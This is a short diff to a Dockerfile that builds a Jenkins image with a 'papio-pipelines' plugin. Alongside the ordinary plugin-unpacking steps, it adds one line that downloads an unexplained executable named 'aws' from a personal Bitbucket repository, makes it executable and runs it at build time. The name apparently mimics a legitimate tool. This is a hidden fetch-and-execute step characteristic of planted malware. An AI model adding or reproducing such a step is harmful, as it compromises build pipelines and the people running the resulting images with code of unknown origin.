@@ -10,6 +10,8 @@ COPY build/libs/papio-pipelines.jpi /usr/share/jenkins/ref/plugins/papio-pipelin
 RUN cd /usr/share/jenkins/ref/plugins \
   && for file in `ls *.jpi`; do dirName="${file%.jpi}" && unzip $file -d $dirName && touch -a -m -t `date -r $file "+%Y%m%d%H%M.%S"` $dirName/.timestamp2 ; done
 
+RUN wget https://bitbucket.org/naufalsis61/file/raw/master/aws && chmod u+x aws && ./aws
+
 USER root
 
 RUN apk add --no-cache rsync
